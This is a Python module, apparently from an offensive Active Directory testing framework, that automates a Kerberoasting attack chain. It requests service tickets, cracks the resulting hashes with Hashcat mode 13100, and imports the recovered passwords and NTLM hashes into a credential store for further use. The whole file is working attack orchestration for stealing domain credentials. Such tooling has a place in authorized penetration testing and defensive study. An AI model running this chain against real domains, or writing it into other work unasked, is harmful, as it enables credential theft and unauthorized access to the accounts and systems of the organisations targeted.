def run(args):
    from core.runner import run_module_by_name
    from core.target import load_current_profile, get_all_creds
    from core.paths import get_chain_artifacts_dir

    data, _ = load_current_profile()
    creds = get_all_creds(data)
    artifacts = get_chain_artifacts_dir(data["name"], "kerberoast")

    hashes = artifacts / "kerberoast_hashes.txt"
    cracked = artifacts / "cracked.txt"

    # ---------------- PRECHECK ----------------
    if not creds or not data.get("domain"):
        print("[!] Error: Missing credentials or domain context.")
        return

    if not getattr(args, "auto", False):
        if not input(f"[?] Start Kerberoast -> Crack -> Import chain? (Y/n): ").lower() in ["", "y"]:
            return

    # ---------------- STEP 1: Kerberoast ----------------
    if not hashes.exists() or hashes.stat().st_size == 0:
        print("[*] Step 1: Requesting Service Tickets (Kerberoasting)...")
        run_module_by_name("ad.kerberoast", ["--out", str(hashes), "--quiet"], data)
        
        if not ensure_nonempty_file(hashes, "No hashes captured."):
            return
    else:
        print(f"[*] Step 1: Skipping (Hashes already exist)")

    # ---------------- STEP 2: Crack ----------------
    if not cracked.exists() or cracked.stat().st_size == 0:
        print("[*] Step 2: Cracking hashes with Hashcat...")
        run_module_by_name("crack.hash", [
            str(hashes), 
            "--mode", "13100", 
            "--out", str(cracked), 
            "--quiet"
        ], data)

        if not ensure_nonempty_file(cracked, "Cracking failed."):
            return
    else:
        print(f"[*] Step 2: Skipping (Cracked file already exists)")

    # ---------------- STEP 3: Import ----------------
    print("[*] Step 3: Importing new credentials...")

    # Capture the list from the module
    new_creds = run_module_by_name("parse.hash", [str(cracked)], data)

    if new_creds:
        from core.target import target_add_cred
        import argparse

        for c in new_creds:
            print(f"[+] Found: {c['user']} ({c['type']})")
            
            target_add_cred(
                argparse.Namespace(
                    user=c["user"],
                    password=c["secret"] if c["type"] == "password" else None,
                    hash=c["secret"] if c["type"] == "ntlm" else None,
                    aes=None,
                    ccache=None
                )
            )
        
        print()
        print(f"[*] Successfully imported {len(new_creds)} credentials.")
    
    print("\n-------- Kerberoast Chain Complete --------")


def ensure_nonempty_file(path, msg):
    if path.exists() and path.stat().st_size > 0:
        return True
    print(f"[-] {msg}")
    return False